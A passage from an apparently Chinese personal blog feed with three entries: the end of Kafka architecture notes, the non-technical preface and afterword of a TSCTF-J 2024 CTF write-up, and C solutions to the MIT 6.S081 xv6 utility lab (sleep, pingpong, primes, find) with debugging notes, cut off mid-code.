会拉取 Leader 的数据进行同步，但不提供服务，如果 Leader 挂掉了，可以将 Follower 提升成 Leader 再对外进行服务。</li><li>ISR（In-Sync Replica）：当Follower与Leader差距较小时，可以被纳入ISR。ISR中的Follower可以升为Leader。</li><li>ZooKeeper ：存储集群元数据</li></ul><h3 id="4-Kafka运行流程">4.Kafka运行流程</h3><h4 id="4-1-数据流">4.1 数据流</h4><p>主要流程是Producer-&gt;Broker-&gt;Consumer</p><h4 id="4-2-Producer-端">4.2 Producer 端</h4><p>在Producer端的主要优化是批量发送。因为Producer将消息发送给Broker后，需要接收确认消息，批量发送可以有效减少交互次数，减少IO次数，提高交互效率<br>在消息容量太大，带宽较小的场景下，Kafka会对数据进行压缩，减少消息的大小，有效利用带宽资源</p><h4 id="4-3-Broker端">4.3 Broker端</h4><p>Broker写入使用顺序写入，减少磁盘寻道成本<br>Consumer 请求消息时会发送 FetchRequest ，Broker 通过索引取出消息，按照时间窗口和信息大小发送给 Consumer。<br>Broker的有两种文件索引方式，通常使用二分法查找目标的位置<br>kafka 拷贝数据的流程不经过用户态空间，而是在读取磁盘后直接将 Read Buffer 中的数据传输到 NIC Buffer，通过 NIC Buffer 直接交付给消费者进程。这种方式减少了拷贝次数，有效提高了效率。</p><h4 id="4-4-缺点">4.4 缺点</h4><ul><li>运维成本高</li><li>负载不均衡</li><li>需要依赖于Page Cache</li><li>若Controller和Coordinator与Broker在同一个进程中，大量 I/O 会导致性能下降。</li></ul>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TSCTF-J 2024-WriteUp</title>
      <link href="/2024/09/tsctfwp/"/>
      <url>/2024/09/tsctfwp/</url>
      
        <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>本来不太想参加，毕竟前几年都是被新生赛暴打，已经被打得没脾气了。前几天zy鸽鸽突然说要打，就抱着当陪练的心态参加了，结果意外地拿了第4（zy鸽鸽第3,还是第一次打周大福，实在是tql，orz orz）。zy鸽鸽这次比赛几乎a穿了web的题（除了zbr这个b出的题），实在🐮波一（而我只能写两道web签到，令人感慨）。在比赛过程中也学了一点东西（但不多，大多数时间都是在坐牢，少部分时间在复习已经会的东西），就记录一下吧。这篇wp中整合了我跟zy鸽鸽的wp，后续如果出官解也会放进来。</p><h2 id="评价">评价</h2><p>你邮新生赛一向以难度逆天著称（大一那一年的新生赛难度还比较正常，可惜当时我太菜了，后来每一年都很逆天，至少不太像给新生做的）。今年依旧很逆天（很多研哥都做不出来两道，比如我室友）。相比较而言，moectf就对新生很友好，希望老毕登们耗子尾汁，好好反思（逃）。</p><h2 id="后记">后记</h2><p>牛魔的xd，纯纯的cs。一整个周末全去坐牢去了，p都没干。毫无意外，周一组会被xd薄纱了。就是不知道xd老惦记他那b深度强化学习干什么玩意。<br>不过破万法那道题确实卡了太久了，没想到最后倒在小小的recv上，不然我可以高高兴兴地去做项目（touching fish）。只想说一句我pwn你🐎。附pwn出题人在wp结尾的吐槽<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/tsctfwp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-09-26%20011956.png" alt="官方吐槽，最为致命"><br>还有看完官解以后，我只想用一句话表达我对ctf的热爱，我c(**)似t(a)的f(ather)</p>]]></content>
      
      
      <categories>
          
          <category> sec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MIT 6.S081 实验1-Util</title>
      <link href="/2024/09/MIT6-S081-lab1/"/>
      <url>/2024/09/MIT6-S081-lab1/</url>
      
        <content type="html"><![CDATA[<h2 id="实验详情">实验详情</h2><h3 id="sleep">sleep</h3><p>目标：实现xv6的UNIX程序<code>sleep</code>：您的<code>sleep</code>应该暂停到用户指定的计时数。一个tick是由xv6内核定义的时间概念，即来自定时器芯片的两个中断之间的时间。您的解决方案应该在文件user/sleep.c中<br>hint:</p><ul><li>在你开始编码之前，请阅读《book-riscv-rev1》的第一章</li><li>参考其他的一些程序（如/user/echo.c, /user/grep.c, /user/rm.c）查看如何获取传递给程序的命令行参数</li><li>如果用户忘记传递参数，sleep应该打印一条错误信息</li><li>命令行参数作为字符串传递; 您可以使用atoi将其转换为数字（详见/user/ulib.c）</li><li>使用系统调用sleep</li><li>请参阅kernel/sysproc.c以获取实现sleep系统调用的xv6内核代码（查找sys_sleep），user/user.h提供了sleep的声明以便其他程序调用，用汇编程序编写的user/usys.S可以帮助sleep从用户区跳转到内核区。</li><li>确保main函数调用exit()以退出程序。</li><li>将你的sleep程序添加到Makefile中的UPROGS中；完成之后，make qemu将编译您的程序，并且您可以从xv6的shell运行它。</li></ul><h2 id="实验答案">实验答案</h2><p>叠甲：本人水平有限，可能并非最优解，或者代码写得比较丑，请见谅<br>过</p><h3 id="sleep-2">sleep</h3><p>命令行参数通过<code>argv</code>传递，其中第一个元素是运行程序的命令，从第二个元素开始是传入程序的参数, <code>argc</code>表示参数的个数，在不传入任何参数的情况下，<code>argc</code>为1。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;Usages: sleep operand...\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> i = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    sleep(i);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="pingpong">pingpong</h3><p>使用两个管道进行父子进程通信，一个pipe负责子进程写父进程读，另一个pipe负责父进程写子进程读。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> p[<span class="number">4</span>];</span><br><span class="line">    pipe(p);</span><br><span class="line">    pipe(p + <span class="number">2</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        close(p[<span class="number">1</span>]);</span><br><span class="line">        close(p[<span class="number">2</span>]);</span><br><span class="line">        <span class="type">int</span> return_state;</span><br><span class="line">        <span class="keyword">if</span> (read(p[<span class="number">0</span>], buf, <span class="number">1</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d: received ping\n&quot;</span>, getpid());</span><br><span class="line">            <span class="keyword">if</span> (write(p[<span class="number">3</span>], <span class="string">&quot;\n&quot;</span>, <span class="number">1</span>) != <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;[*]2: Write error\n&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            return_state = <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            return_state = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        close(p[<span class="number">0</span>]);</span><br><span class="line">        close(p[<span class="number">3</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(return_state);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        close(p[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">if</span> (write(p[<span class="number">1</span>], <span class="string">&quot;\n&quot;</span>, <span class="number">1</span>) != <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;[*]1: Write error\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        close(p[<span class="number">1</span>]);</span><br><span class="line">        <span class="type">int</span> return_state;</span><br><span class="line">        wait(&amp;return_state);</span><br><span class="line">        <span class="keyword">if</span> (return_state == <span class="number">0</span> &amp;&amp; read(p[<span class="number">2</span>], buf, <span class="number">1</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d: received pong\n&quot;</span>, getpid());</span><br><span class="line">            return_state = <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            return_state = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        close(p[<span class="number">2</span>]);</span><br><span class="line">        close(p[<span class="number">3</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(return_state);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;[*] Fork error!\n&quot;</span>);</span><br><span class="line">        close(p[<span class="number">0</span>]);</span><br><span class="line">        close(p[<span class="number">1</span>]);</span><br><span class="line">        close(p[<span class="number">2</span>]);</span><br><span class="line">        close(p[<span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="primes">primes</h3><p>思路是采用递归，每次先尝试从左pipe中读取一个数，如果读不到说明已经到达终点，exit，否则再创建一个右pipe并fork一个子进程，将筛选后的数输入进这个右pipe。<br>大坑：默认pipe是阻塞模式，即在写管道开启的情况下，如果读管道中没有数据，则会阻塞读操作，直到管道另一端写入数据。因此<strong>如果只读，需要及时关闭管道的写端</strong>。并且xv6给的资源不多，需要及时关闭不用的文件标识符，否则后续会报资源不足。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> uint INT_LEN = <span class="keyword">sizeof</span>(<span class="type">int</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">read_first_int</span><span class="params">(<span class="type">int</span>* p, <span class="type">int</span>* dst)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (read(p[<span class="number">0</span>], dst, INT_LEN) == INT_LEN) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;prime %d\n&quot;</span>, *dst);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">read_other_int</span><span class="params">(<span class="type">int</span>* lp, <span class="type">int</span>* rp, <span class="type">int</span> div_num)</span> &#123;</span><br><span class="line"><span class="type">int</span> cur_num;</span><br><span class="line"><span class="keyword">while</span> (read(lp[<span class="number">0</span>], &amp;cur_num, INT_LEN) == INT_LEN) &#123;</span><br><span class="line"><span class="keyword">if</span> (cur_num % div_num != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (write(rp[<span class="number">1</span>], &amp;cur_num, INT_LEN) != INT_LEN) &#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;[*] Write err!\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">close(rp[<span class="number">1</span>]);</span><br><span class="line">close(lp[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_prime</span><span class="params">(<span class="type">int</span>* lp)</span> &#123;</span><br><span class="line"><span class="type">int</span> div_num;</span><br><span class="line"><span class="type">int</span> return_state;</span><br><span class="line"><span class="keyword">if</span> (read_first_int(lp, &amp;div_num) == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="type">int</span> rp[<span class="number">2</span>];</span><br><span class="line">pipe(rp);</span><br><span class="line">read_other_int(lp, rp, div_num);</span><br><span class="line"><span class="type">int</span> pid = fork();</span><br><span class="line"><span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;[*] Fork err!\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">get_prime(rp);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">wait(&amp;return_state);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> p[<span class="number">2</span>];</span><br><span class="line">pipe(p);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt; <span class="number">36</span>; i ++) &#123;</span><br><span class="line"><span class="keyword">if</span> (write(p[<span class="number">1</span>], &amp;i, INT_LEN) != INT_LEN) &#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;[*] Write err!\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">close(p[<span class="number">1</span>]);</span><br><span class="line"><span class="type">int</span> pid = fork();</span><br><span class="line"><span class="type">int</span> return_state;</span><br><span class="line"><span class="keyword">if</span> (pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">wait(&amp;return_state);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">get_prime(p);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;[*] Fork err!\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">exit</span>(return_state);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="find">find</h3><p><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/MIT6-S081-lab1/2024-09-02%20144834.png" alt=""></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/fs.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/fcntl.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>*</span><br><span class="line"><span class="title function_">fmtname</span><span class="params">(<span class="type">char</span> *path, <span class="type">int</span> path_len)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">static</span> <span class="type">char</span> buf[DIRSIZ+<span class="number">1</span>];</span><br><span class="line">  <span class="type">char</span> *p;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Find first character after last slash.</span></span><br><span class="line">  <span class="keyword">for</span>(p=path+path_len; p &gt;= path &amp;&amp; *p != <span class="string">&#x27;/&#x27;</span>; p--);</span><br><span class="line">  p++;</span><br><span class="line"></span><br><span class="line">  memmove(buf, p, path_len);</span><br><span class="line">  <span class="keyword">return</span> buf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">find</span><span class="params">(<span class="type">char</span>* path, <span class="type">char</span>* pattern)</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">512</span>], *p;</span><br><span class="line">    <span class="comment">// 文件标识符</span></span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="comment">// 目录文件的信息</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> <span class="title">de</span>;</span></span><br><span class="line">    <span class="comment">//文件的信息</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">    <span class="comment">// 打开文件</span></span><br><span class="line">    fd = open(path, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;find: cannot open %s\n&quot;</span>, path);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 存储打开文件的信息</span></span><br><span class="line">    <span class="keyword">if</span> (fstat(fd, &amp;st) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;find: cannot stat %s\n&quot;</span>, path);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(path);</span><br><span class="line">    <span class="type">char</span>* cur_file = fmtname(path, len);</span><br><span class="line">    <span class="type">int</span> flag = (!<span class="built_in">strcmp</span>(pattern, <span class="string">&quot;*&quot;</span>) || !<span class="built_in">strcmp</span>(cur_file, pattern));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s %d\n&quot;</span>, path, st.type);</span><br><span class="line">    <span class="keyword">switch</span>(st.type) &#123;</span><br><span class="line">        <span class="keyword">case</span> T_DEVICE:</span><br><span class="line">        <span class="keyword">case</span> T_FILE:</span><br><span class="line">            <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, path);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> T_DIR:</span><br><span class="line">            <span class="keyword">if</span> (len + DIRSIZ + <span class="number">2</span> &gt; <span class="keyword">sizeof</span>(buf)) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;find: path too long\n&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">strcpy</span>(buf, path);</span><br><span class="line">            p = buf + len;</span><br><span class="line">            *p++ = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">            <span class="comment">// 从目录中读取文件</span></span><br><span class="line">            <span class="keyword">while</span> (read(fd, &amp;de, <span class="keyword">sizeof</span>(de)) == <span class="keyword">sizeof</span>(de)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (de.inum == <span class="number">0</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                memmove(p, de.name, DIRSIZ);</span><br><span class="line">                p[DIRSIZ] = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> (stat(buf, &amp;st) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;find: cannot stat %s\n&quot;</span>, buf);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(de.name, <span class="string">&quot;.&quot;</span>) || !<span class="built_in">strcmp</span>(de.name, <span class="string">&quot;..&quot;</span>))</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">                    find(buf, <span class="string">&quot;*&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    find(buf, pattern);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="keyword">switch</span> (argc) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            find(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;*&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            find(argv[<span class="number">1</span>], <span class="string">&quot;*&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            find(argv[<span class="number">1</span>], argv[<span class="number">2</span>]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="xargs">xargs</h3><h2 id="踩坑记录">踩坑记录</h2><h3 id="编译报错">编译报错</h3><p><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/MIT6-S081-lab1/2024-08-30%20133636.png" alt="错误信息"><br>可以将Makefile的<code>-Werror</code>去掉，或者<code>runcmd</code>函数中添加<code>__attribute__((noreturn))</code><br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/MIT6-S081-lab1/2024-08-30%20133932.png" alt="解决"><br>最根本的应该是xv6版本和qemu版本不匹配的锅，需要更新xv6（或者回退qemu的版本）</p><h3 id="pingpong-2">pingpong</h3><p>ctrl c/v的锅，放上来给大伙看个乐子<br><img src="https://gitee.com/vegetablechicken-dev/pic/raw/master/img/MIT6-S081-lab1/2024-08-30%20210607.png" alt="复制粘贴的锅"></p><h3 id="primes挂起">primes挂起</h3><p>在qemu中运行primes，发现qemu在打印出<code>prime 2</code>后就不动了。<br>尝试使用gdb调试子进程，但是失败力(悲)。<br>后来发现是以下代码的锅</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> pid = fork();</span><br><span class="line"><span class="type">int</span> return_state;</span><br><span class="line"><span class="keyword">if</span> (pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    close(p[<span class="number">1</span>]);</span><br><span class="line">wait(&amp;return_state);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">get_prime(p);</span><br><span 